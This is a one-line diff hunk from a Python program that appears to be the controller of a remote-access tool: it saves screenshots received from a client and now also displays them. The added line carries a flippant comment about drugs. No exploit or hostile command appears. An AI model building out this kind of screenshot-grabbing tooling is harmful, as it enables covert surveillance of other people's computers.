@@ -802,7 +802,7 @@ Open Ports
                             incoming_file.write(data)
 
                         print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Screenshot saved to '{fl}'".format(fl=FinalF))
-
+                        showImage(FinalF) # Don't do school, Stay in drugs
                     except Exception as e:
                         print("[X] Error : " + str(e))
                         print("[i] Screenshot Download Information : " + client_data)
